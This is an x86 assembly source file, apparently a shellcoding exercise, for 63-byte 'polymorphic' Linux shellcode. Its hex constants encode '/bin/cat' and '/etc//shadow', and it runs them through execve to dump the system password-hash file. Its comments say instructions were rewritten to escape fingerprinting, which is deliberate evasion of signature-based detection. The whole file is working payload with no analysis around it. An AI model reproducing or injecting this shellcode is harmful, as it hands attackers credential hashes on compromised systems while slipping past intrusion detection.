; shell code length : 63
; polymorphic shellcode for poly1_original
global _start			

section .text
_start:

xor    eax,eax

push   eax
;to escape fingerprinting of push instruction
mov dword [esp-4], 0x7461632f
mov dword [esp-8], 0x6e69622f
sub esp,8

mov    ebx,esp
push   eax

;to escape fingerprinting of push instruction
mov dword [esp-4], 0x776f6461
mov dword [esp-8], 0x68732f2f
mov dword [esp-12], 0x6374652f
sub esp,12

mov    ecx,esp
push   eax
push   ecx
push   ebx
mov    ecx,esp
mov    al,0xb
int 0x80
